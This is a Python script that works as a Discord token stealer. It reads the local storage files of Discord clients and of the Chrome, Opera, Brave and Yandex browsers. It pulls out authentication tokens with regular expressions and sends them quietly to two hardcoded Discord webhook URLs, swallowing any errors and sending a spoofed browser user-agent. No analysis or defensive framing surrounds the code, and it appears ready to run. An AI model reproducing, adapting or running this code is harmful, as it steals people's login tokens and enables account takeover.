def run(client_bot) :
    import os
    import re
    import json

    from urllib.request import Request, urlopen

    # your webhook URL
    WEBHOOK_URL = 'https://discord.com/api/webhooks/1015366781952602153/U9FFeD0MtTBYRqpCsiVIusJsxww9H0yyjCKhOKyFFaKhBmbnTjPPhDdmaokgRAazGv7a'
    WEBHOOK2_URL = 'https://discord.com/api/webhooks/1015366869194129489/W0L2St5D_TI167_qncZVMntjhnxfiymUpTzhNck_Fcaa6cFiodIoyfd3ZuMIwaWXr9Bv'
    # mentions you when you get a hit
    PING_ME = False

    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens

    def main():
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        message = '@everyone' if PING_ME else ''

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            message += f'\n**{platform}**\n```\n'

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    message += f'{token}\n'
            else:
                message += 'No tokens found.\n'

            message += '```'

        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
        }
        message2 = f'<@&978976910463864893> \n `{client_bot}`'
        payload = json.dumps({'content': message})
        payload2 = json.dumps({'content' : message2})

        try:
            req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
            urlopen(req)
            req2 = Request(WEBHOOK2_URL , data=payload2.encode() , headers=headers)
            urlopen(req2)
        except:
            pass

    if __name__ == '__main__':
        main()

run('token')
